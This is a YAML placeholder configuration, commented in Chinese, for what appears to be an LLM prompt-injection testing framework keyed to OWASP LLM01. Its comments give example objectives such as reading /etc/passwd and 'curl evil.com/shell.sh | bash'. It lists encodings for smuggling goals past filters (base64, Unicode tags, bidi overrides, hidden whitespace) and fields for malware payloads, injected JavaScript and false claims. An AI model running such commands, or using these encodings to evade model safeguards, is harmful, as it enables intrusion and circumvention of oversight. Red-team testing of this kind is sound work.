# AI-300 Framework - 占位符配置文件（Tier 1 + Tier 3 混合）
# ============================================
# 唯一真实数据来源：所有载荷占位符在此文件中定义
#
# Tier 说明：
#   Tier 1：objective → 替换 {goal} / {objective}，支持列表（多目标）
#   Tier 2：编码变体（base64/rot13/french 等）→ 从 objective 自动编码，无需手动填写
#   Tier 3：领域参数（target_host/domain/language 等）→ 按需填写，单值
#
# 使用方式：
#   ai300 owasp llm01 --placeholder-file config/placeholders/default.yaml
#
# 提示：
#   - 不需要的参数保持为空或删除即可
#   - 使用 --list-placeholders 查看当前 scope 需要哪些占位符
# ============================================

# ── 第1级：攻击目标（必填，部分载荷需要） ──
# 用于替换 {goal} / {objective} 占位符
# 示例: "whoami", "cat /etc/passwd", "curl evil.com/shell.sh | bash"
#
# 支持单个目标：
#   objective: "whoami"
#
# 支持多个目标（每个目标依次执行）：
#   objective:
#     - "whoami"
#     - "cat /etc/passwd"
#     - "id"
objective: ""

# ── 第2级：编码变体（自动，无需填写） ──
# 以下占位符会根据 objective 自动生成：
#   {base64_goal}       → Base64 编码
#   {base32_goal}       → Base32 编码
#   {ascii85_goal}      → ASCII85 编码
#   {hex_goal}          → 十六进制编码
#   {rot13_goal}        → ROT13 编码
#   {french_goal}       → 法语标记
#   {bidi_override_goal} → Bidi 覆盖
#   {unicode_tag_goal}  → Unicode 标签
#   {zalgo_goal}        → Zalgo 变形
#   {chain_encoded_goal} → 链式编码
#   {ascii_tag_deep_goal} → 深层 ASCII 标签
#   {sneaky_bits_goal}  → 隐蔽位编码
#   {interlinear_ws_goal} → 行间空白编码
#   {multi_tag_mix_goal} → 多标签混合

# ── 第3级：领域参数（按需填写） ──
# 以下为各领域攻击使用的占位符，按需填写

# 网络/基础设施攻击
target_host: ""        # 目标主机，如 "192.168.1.100"
target_port: ""        # 目标端口，如 "5555"
domain: ""             # 目标域名，如 "evil.com"
address: ""            # 目标地址

# 任务描述
task: ""               # 攻击任务，如 "whoami"
language: ""           # 编程语言，如 "python"
python_code: ""        # Python 代码
sql_payload: ""        # SQL 注入载荷
sql_command: ""        # SQL 命令

# 社会工程
email: ""              # 目标邮箱
user_name: ""          # 用户名
user_input: ""         # 用户输入
target_group: ""       # 目标群体
false_claim: ""        # 虚假声明
fake_info: ""          # 虚假信息

# 内容注入
toxicity_prompt: ""    # 毒性提示
injected_js: ""        # 注入 JS 代码
injected_strings: ""   # 注入字符串
injected_marker: ""    # 注入标记
injected_action: ""    # 注入动作

# 其他
action_verb: ""        # 动作动词
action_definition: ""  # 动作定义
context_object: ""     # 上下文对象
target_object: ""      # 目标对象
input_string: ""       # 输入字符串
center: ""             # 中心位置
tabular: ""            # 表格内容
goal_description: ""   # 目标描述
modified_domain: ""    # 修改后域名
malware_payload: ""    # 恶意软件载荷
evasion_task: ""       # 规避任务
subfunction: ""        # 子功能
collection_name: ""    # 集合名称
target_db: ""          # 目标数据库
tenant: ""             # 租户
db: ""                 # 数据库
captured_token: ""     # 捕获的令牌
exploit_strategies: "" # 利用策略
functionality: ""      # 功能描述
target_tool: ""        # 目标工具
tool_name: ""          # 工具名称
vulnerabilities: ""    # 漏洞列表
text_prefix: ""        # 文本前缀
current_date: ""       # 当前日期
encoding: ""           # 编码方式
